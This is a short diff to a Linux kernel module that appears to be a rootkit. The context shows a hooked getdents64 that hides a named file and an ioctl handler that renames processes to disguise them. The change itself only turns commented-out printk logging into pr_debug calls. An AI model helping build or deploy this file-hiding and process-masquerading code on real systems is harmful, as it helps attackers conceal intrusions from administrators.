@@ -204,7 +204,7 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 	}
 	rcu_read_unlock();
 
-	// printk(KERN_INFO "HIDDEN_FILE: %s\n", HIDDEN_FILE);
+	pr_debug("HIDDEN_FILE: %s\n", HIDDEN_FILE);
 
 	// Hold the lock across the whole scan: HIDDEN_FILE is read (and its contents
 	// dereferenced via strlen/memcmp) throughout the loop below, so it must not
@@ -351,7 +351,7 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			if (user_req.len > 256)
 				return -EINVAL;
 
-			// printk(KERN_INFO "Received masq_proc_req: len = %zu\n", user_req.len);
+			pr_debug("Received masq_proc_req: len = %zu\n", user_req.len);
 			req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
 			if (!req_array) {
 				printk(KERN_INFO "Memory allocation failed\n");
@@ -368,11 +368,11 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 				// when strscpy is called in change_process_name.
 				// strnlen guards against non-null-terminated user-filled fields.
 				if (strnlen(req_array[i].new_name, MASQ_LEN) >= strnlen(req_array[i].orig_name, MASQ_LEN)) {
-					// printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
+					pr_debug("Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
 					continue;
 				}
 				change_process_name(req_array[i].orig_name, req_array[i].new_name);
-				// printk(KERN_INFO "Received masq_proc[%zu]: Original name: %s, New name: %s\n", i, req_array[i].orig_name, req_array[i].new_name);
+				pr_debug("Received masq_proc[%zu]: Original name: %s, New name: %s\n", i, req_array[i].orig_name, req_array[i].new_name);
 			}
 
 			kfree(req_array);
